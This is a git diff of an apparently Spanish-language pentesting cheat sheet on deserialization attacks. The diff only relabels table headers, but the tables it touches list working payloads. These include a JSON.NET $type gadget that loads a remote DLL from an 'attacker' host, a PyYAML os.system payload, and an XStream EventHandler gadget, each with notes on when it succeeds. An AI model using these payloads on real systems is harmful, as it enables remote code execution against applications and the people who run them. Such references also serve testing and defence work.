@@ -24,7 +24,7 @@ linked:
 
 ## JSON Polymorphic
 
-| **Objetivo** | **Payload / Comando** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Newtonsoft.Json TypeNameHandling | `{"$type":"System.IO.FileInfo, mscorlib","fileName":"path"}` | Si `TypeNameHandling = All / Auto / Objects` → instancia tipos arbitrarios. |
 | JSON.NET RCE | `{"$type":"System.Configuration.Install.AssemblyInstaller, System.Configuration.Install","Path":"http://attacker/evil.dll"}` | Carga assembly remoto. |
@@ -64,7 +64,7 @@ ___
 
 ## YAML Eval
 
-| **Objetivo** | **Payload / Comando** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | PyYAML `yaml.load()` (sin Loader) | `!!python/object/apply:os.system ["id"]` | Pre-PyYAML 5.1 = RCE inmediato. |
 | PyYAML moderno (con Loader=yaml.Loader) | Mismo payload — Loader unsafe = RCE. | Solo `SafeLoader` está safe. |
@@ -104,7 +104,7 @@ ___
 
 ## XML Deserialization
 
-| **Objetivo** | **Payload / Comando** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | XStream (Java) — clásico | `<map><entry><java.beans.EventHandler>...</java.beans.EventHandler></entry></map>` | EventHandler-based RCE. |
 | XStream CVE-2021-39139 | Decenas de gadgets — JdkDynamicAggregateTranslator, etc. | Versiones < 1.4.18. |
